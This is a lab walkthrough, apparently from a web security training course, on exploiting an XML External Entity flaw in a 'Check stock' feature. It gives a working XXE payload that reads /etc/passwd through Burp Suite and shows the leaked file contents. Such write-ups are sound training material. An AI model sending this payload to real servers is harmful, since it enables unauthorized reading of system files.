# Lab: Exploiting XXE Using External Entities to Retrieve Files

## Description

This lab contains a "Check stock" feature that accepts XML input. The application parses the supplied XML and reflects unexpected values in the response. The objective is to exploit an XML External Entity (XXE) vulnerability to retrieve the contents of the `/etc/passwd` file from the server.

## Vulnerability Overview

The application processes user-supplied XML without disabling external entity resolution. As a result, an attacker can define an external entity that references a local file on the server and then use that entity within the XML document. The XML parser resolves the entity and includes the file contents in the application's response.

## Exploitation Steps

1. Navigate to any product page.
2. Click **Check stock**.
3. Intercept the POST request using Burp Suite.
4. Insert the following DOCTYPE declaration between the XML declaration and the `<stockCheck>` element:

```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

5. Replace the value of the `<productId>` element with the external entity reference:

```xml
&xxe;
```

The modified request becomes:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

6. Forward the request to the server.

## Result

The XML parser resolves the external entity and reads the `/etc/passwd` file. Since the application reflects invalid product IDs in its response, the contents of the file are returned to the user.

Example response:

```text
Invalid product ID:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```
